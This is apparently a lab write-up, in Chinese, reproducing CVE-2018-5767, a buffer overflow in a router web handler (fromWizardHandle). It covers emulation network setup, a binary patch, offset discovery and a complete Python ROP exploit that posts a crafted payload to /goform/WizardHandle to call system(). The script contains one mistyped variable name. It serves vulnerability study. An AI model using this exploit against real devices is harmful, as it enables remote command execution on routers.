# CVE-2018-5767

![image.png](images/img_17450_000.png)

配置一个虚拟桥接接口，加一个本地的br0网桥，桥接到ens32：

```
sudo brctl addbr br0    	# addbr：创建一个新的桥接接口。一个名为 br0 的虚拟桥接接口。
sudo brctl addif br0 ens32 	# addif：将一个物理网络接口添加到桥接接口中。 理网络接口 ens32 添加到桥接接口 br0 中。这意味着 ens32 上的流量将通过 br0 进行桥接。
sudo ifconfig br0 up	    # 用桥接接口 br0，使其开始工作。
sudo dhclient br0		    # dhclient：是一个 DHCP 客户端工具，用于从 DHCP 服务器获取 IP 地址和其他网络配置信息。 动 DHCP 客户端，从 DHCP 服务器获取 IP 地址和其他网络配置信息，并将其应用到桥接接口 br0 上。
```

![image.png](images/img_17450_085.png)

1. 定位到fromWizardHandle函数：这个函数在循环赋值得到时候没有长度限制，导致溢出：![image.png](images/img_17450_086.png)只需要绕过一个条件即可，WANT赋值为"2"![image.png](images/img_17450_087.png)但是这个程序运行起来，会在这里报错调用atoi将字符串转化为数字的时候报错：![image.png](images/img_17450_088.png)看汇编如下，这里给atoi函数传参时只给了一个字节![image.png](images/img_17450_089.png)动调显示也只有一个字节。所以这里给的参数不正确（即使是在正常的请求下也会报错）![image.png](images/img_17450_090.png)正常情况如下，应该给的参数是指向字符串的**地址**：![image.png](images/img_17450_091.png)![image.png](images/img_17450_092.png)修改方法，将LDRB指令改为LDR即可：![image.png](images/img_17450_093.png)
2. 测试偏移为320：![image.png](images/img_17450_094.png)exp如下：

```
import requests
from pwn import *

url = "http://192.168.72.140/goform/WizardHandle"
cmd = b"echo hello bkbqwq"
libc = ELF("./lib/libc.so.0")
puts_offset = libc.sym["puts"]
success("puts_offset ==> " + hex(libc.sym["puts"]))

libc_base = 0x40a25cd4 - puts_offset
success("libc_base ==>" + hex(libc_base))
system_addr = libc_base + libc.sym["system"]
gadget1 = libc_base + 0x18298
gadget2 = libc_base + 0x40cb8

success("system ==> " + hex(system_addr))
success("gadget1 ==> "+ hex(gadget1))
success("gadget2 ==> "+ hex(gadget2))

payload = b"a"*320 + p32(gadget1) + p32(system_addrs) + p32(gadget2) + cmd

cookie = {"Cookie":"password=12345"}
data = {"WANT":"2","PPW": payload}       
requests.post(url=url, cookies=cookie,data=data)
response = requests.post(url=url, cookies=cookie, data=data)
print(response.text)
```
